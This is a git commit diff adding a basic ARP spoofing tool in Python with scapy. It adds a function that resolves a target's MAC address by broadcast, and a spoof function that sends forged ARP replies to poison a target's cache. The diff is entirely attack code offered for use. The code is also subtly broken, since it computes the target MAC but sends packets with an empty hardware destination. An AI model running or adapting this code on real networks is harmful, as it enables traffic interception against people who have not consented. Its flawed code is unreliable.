ab30626d93fa7fbd43cfc6ca05f8af6b7b9d59d5
Tony Nguyen <69164218+Tnguye98@users.noreply.github.com>
2022-07-25 13:45:57 -0400

    Update arpSpoofer.py
    Basic arp spoofer.

--- Python/arpSpoofer.py
+++ Python/arpSpoofer.py
@@ -2,5 +2,17 @@
 
 import scapy.all as scapy
 
+def getMAC(ip):
+	arpRequest = scapy.ARP(pdst=ip)
+	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+	arpRequestBroadcast = broadcast/arpRequest
+	answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
+
+	return answeredList[0][1].hwsrc
+
+
 def spoof(targetIP, spoofIP):
-	
+	targetMAC = getMAC(targetIP)
+	packet = scapy.ARP(op = 2, pdst = targetIP, hwdst = "", psrc = spoofIP)
+	scapy.send(packet)
+
